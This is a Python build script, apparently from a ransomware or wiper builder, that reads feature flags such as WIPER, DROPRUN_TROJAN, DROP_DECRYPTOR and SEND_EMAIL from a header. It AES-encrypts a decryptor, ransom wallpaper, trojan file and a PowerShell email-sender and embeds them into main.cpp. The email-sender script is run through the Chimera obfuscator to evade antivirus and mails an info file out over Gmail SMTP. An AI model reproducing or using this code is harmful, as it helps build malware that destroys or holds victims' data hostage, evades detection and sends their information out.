import base64, sys, os, platform, subprocess, importlib
sys.setrecursionlimit(2147483647)      # for bigger files

try:
    importlib.import_module("Cryptodome")
except ImportError:
    subprocess.run(["pip", "install", "pycryptodome"])
try:
    from Cryptodome.Cipher import AES
    from Cryptodome.Util.Padding import pad
except ImportError:
    print(f'preComp.py: library "pycryptodome" not installed')
    exit()

emailSenderLastPath = ''
key = ''
iv = ''
DEBUG = False
CUSTOM_FILE = False
DROPRUN_TROJAN = False
WIPER = False
DROP_DECRYPTOR = False
CHANGE_WALLPAPER = False
DEBUG_SEND_EMAIL = False
SEND_EMAIL = False
CHANGE_FILE_ICON = False
for line in open('../commons/common.h', 'r').readlines():
    if '#define DEBUG' in line and 'true' in line:
        DEBUG = True
    if '#define EMAILSENDER' in line:
        emailSenderLastPath = line.split('"')[1].replace('\\\\', '\\')
    if '#define DROP_CUSTOM_FILE' in line and 'true' in line:
        CUSTOM_FILE = True
    if '#define DROPRUN_TROJAN_FILE' in line and 'true' in line:
        DROPRUN_TROJAN = True
    if '#define WIPER' in line and 'true' in line:
        WIPER = True
    if '#define CHANGE_WALLPAPER' in line and 'true' in line:
        CHANGE_WALLPAPER = True
    if '#define DROP_DECRYPTOR' in line and 'true' in line:
        DROP_DECRYPTOR = True
    if '#define DEBUG_SEND_EMAIL' in line and 'true' in line:
        DEBUG_SEND_EMAIL = True
    if '#define SEND_EMAIL' in line and 'true' in line:
        SEND_EMAIL = True
    if '#define CHANGE_FILE_ICON' in line and 'true' in line:
        CHANGE_FILE_ICON = True
    if '#define IV' in line:
        iv = line.split('"')[1].encode()
    if '#define KEY' in line and '#define KEYOFKEY' not in line:
        key = line.split('"')[1].encode()

def split_str(seq, chunk, skip_tail=False):
    lst = []
    if chunk <= len(seq):
        lst.extend([seq[:chunk]])
        lst.extend(split_str(seq[chunk:], chunk, skip_tail))
    elif not skip_tail and seq:
        lst.extend([seq])
    return lst


def encryptString(string):
    return os.popen('powershell [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes(\\"' + str(string) + '\\"))').read()[:-1]

def getEmailSenderCryptedAndEncoded(filePath):
    SENDERMAIL = "defaultSenderEmail@email.com"
    SENDERPSW = "password1234!"
    RECEIVERMAIL = "defaultReceiverEmail@email.com"
    EMAILSUBJECT = "Default Subject"
    EMAILBODY = "Default body"
    INFOFILE = "default/path/to/info.txt"
    server = 'smtp.gmail.com'
    port = 587
    host = 'www.google.com'


    for line in open('../commons/common.h', 'r').readlines():
        if ' ' in line:
            if line.split(' ')[1].split('\t')[0] == 'SENDERMAIL':
                SENDERMAIL = line.split('"')[1]
            elif line.split(' ')[1].split('\t')[0] == 'SENDERPSW':
                SENDERPSW = line.split('"')[1]
            elif line.split(' ')[1].split('\t')[0] == 'RECEIVERMAIL':
                RECEIVERMAIL = line.split('"')[1]
            elif line.split(' ')[1].split('\t')[0] == 'EMAILSUBJECT':
                EMAILSUBJECT = line.split('"')[1]
            elif line.split(' ')[1].split('\t')[0] == 'EMAILBODY':
                EMAILBODY = line.split('"')[1]
            elif line.split(' ')[1].split('\t')[0] == 'INFOFILE':
                INFOFILE = line.split('"')[1]


    shellText = open(filePath, 'r').read()
    shellText = shellText.replace("SENDERMAIL", encryptString(SENDERMAIL))
    shellText = shellText.replace("SENDERPSW", encryptString(SENDERPSW))
    shellText = shellText.replace("RECEIVERMAIL", encryptString(RECEIVERMAIL))
    shellText = shellText.replace("EMAILSUBJECT", encryptString(EMAILSUBJECT))
    shellText = shellText.replace("EMAILBODY", encryptString(EMAILBODY))
    shellText = shellText.replace("INFOFILE", encryptString(INFOFILE))
    shellText = shellText.replace("SERVER", encryptString(server))
    shellText = shellText.replace("PORT", encryptString(port))
    shellText = shellText.replace("HOST", encryptString(host))
    shellText = shellText.replace("PATH", encryptString(emailSenderLastPath))

    open('emailSenderReal.ps1', 'w').write(shellText)
    if not DEBUG or not os.path.exists('chimera.ps1'):
        if platform.machine().endswith('64'):
            os.system(f'start /wait "" "%PROGRAMFILES%\\Git\\bin\\sh.exe" --login -i -c "./chimera.sh -f ./emailSenderReal.ps1 -o chimera.ps1 -l 5 -v -t -c -i -h -s -b -j -g -k -p -d"')
        else:
            os.system(f'start /wait "" "%SYSTEMDRIVE%\\Program Files (x86)\\Git\\bin\\sh.exe" --login -i -c "./chimera.sh -f ./emailSenderReal.ps1 -o chimera.ps1 -l 5 -v -t -c -i -h -s -b -j -g -k -p -d"')
    os.remove('emailSenderReal.ps1')

    cipher = AES.new(key, AES.MODE_CBC, iv)
    returner = base64.b64encode(cipher.encrypt(pad(open('chimera.ps1', 'rb').read(), AES.block_size))).decode()
    if not DEBUG:
        os.remove('chimera.ps1')
    return returner


def checkFileLocation(file, iLine):
    if not os.path.exists(file):
        print(f'main.cpp {iLine}: error PreComp: file "{file}" not found')
        exit()



main_cppRead = open('main.cpp', 'r')
content = ""

i = 0
for line in main_cppRead.readlines():
    i += 1
    #print(line, end='')

    if line.split('=')[0] == 'string DataDecryptorContent ' and line.split('=')[1] != ' \n':
        content += 'string DataDecryptorContent = \n'
        decryptorPath = line.split('"')[1]
        decryptorContent = base64.b64encode('nothing to read here :) - Tuga'.encode()).decode()
        if DROP_DECRYPTOR and not WIPER:
            checkFileLocation(decryptorPath, i)
            cipher = AES.new(key, AES.MODE_CBC, iv)
            decryptorContent = base64.b64encode(cipher.encrypt(pad(base64.b64encode(open(decryptorPath, 'rb').read()), AES.block_size))).decode()
        open('preCompilation.tmp', 'a').write("decryptor=" + decryptorPath + "\n")
        for subContent in split_str(decryptorContent, 1000, False):
            content += '"'+subContent+'"\n'
        content += ';\n'
        continue

    if line.split('=')[0] == 'string WallpaperContent ' and line.split('=')[1] != ' \n':
        content += 'string WallpaperContent = \n'
        wallpaperPath = line.split('"')[1]
        wallpaperContent = base64.b64encode('nothing to read here :) - Tuga'.encode()).decode()
        if CHANGE_WALLPAPER:
            checkFileLocation(wallpaperPath, i)
            cipher = AES.new(key, AES.MODE_CBC, iv)
            wallpaperContent = base64.b64encode(cipher.encrypt(pad(open(wallpaperPath, 'rb').read(), AES.block_size))).decode()
        open('preCompilation.tmp', 'a').write("wallpaper=" + wallpaperPath + "\n")
        for subContent in split_str(wallpaperContent, 500, False):
            content += '"'+subContent+'"\n'
        content += ';\n'
        continue

    if line.split('=')[0] == 'string EmailSenderContent ' and line.split('=')[1] != ' \n':
        content += 'string EmailSenderContent = \n'
        emailSenderPath = line.split('"')[1]
        emailSenderContent = base64.b64encode('nothing to read here :) - Tuga'.encode()).decode()
        if (DEBUG_SEND_EMAIL if DEBUG else SEND_EMAIL):
            checkFileLocation(emailSenderPath, i)
            emailSenderContent = getEmailSenderCryptedAndEncoded(emailSenderPath)
        open('preCompilation.tmp', 'a').write("emailsender=" + emailSenderPath + "\n")
        for subContent in split_str(emailSenderContent, 500, False):
            content += '"'+subContent+'"\n'
        content += ';\n'
        continue

    if line.split('=')[0] == 'string FileIconContent ' and line.split('=')[1] != ' \n':
        content += 'string FileIconContent = \n'
        fileIconPath = line.split('"')[1]
        fileIconContent = base64.b64encode('nothing to read here :) - Tuga'.encode()).decode()
        if CHANGE_FILE_ICON:
            checkFileLocation(fileIconPath, i)
            cipher = AES.new(key, AES.MODE_CBC, iv)
            fileIconContent = base64.b64encode(cipher.encrypt(pad(open(fileIconPath, 'rb').read(), AES.block_size))).decode()
        open('preCompilation.tmp', 'a').write("fileicon=" + fileIconPath + "\n")
        for subContent in split_str(fileIconContent, 500, False):
            content += '"'+subContent+'"\n'
        content += ';\n'
        continue

    if line.split('=')[0] == 'string CustomFileContent ' and line.split('=')[1] != ' \n':
        content += 'string CustomFileContent = \n'
        customFilePath = line.split('"')[1]
        customFileContent = base64.b64encode('nothing to read here :) - Tuga'.encode()).decode()
        if CUSTOM_FILE:
            checkFileLocation(customFilePath, i)
            cipher = AES.new(key, AES.MODE_CBC, iv)
            customFileContent = base64.b64encode(cipher.encrypt(pad(open(customFilePath, 'rb').read(), AES.block_size))).decode()
        open('preCompilation.tmp', 'a').write("customfile=" + customFilePath + "\n")
        for subContent in split_str(customFileContent, 500, False):
            content += '"'+subContent+'"\n'
        content += ';\n'
        continue

    if line.split('=')[0] == 'string TrojanFileContent ' and line.split('=')[1] != ' \n':
        content += 'string TrojanFileContent = \n'
        trojanFilePath = line.split('"')[1]
        trojanFileContent = base64.b64encode('nothing to read here :) - Tuga'.encode()).decode()
        if DROPRUN_TROJAN:
            checkFileLocation(trojanFilePath, i)
            cipher = AES.new(key, AES.MODE_CBC, iv)
            trojanFileContent = base64.b64encode(cipher.encrypt(pad(open(trojanFilePath, 'rb').read(), AES.block_size))).decode()
        open('preCompilation.tmp', 'a').write("trojanfile=" + trojanFilePath + "\n")
        for subContent in split_str(trojanFileContent, 500, False):
            content += '"'+subContent+'"\n'
        content += ';\n'
        continue

    content += line

main_cppRead.close()

main_cppWrite = open('main.cpp', 'w')
main_cppWrite.write(content)
main_cppWrite.close()
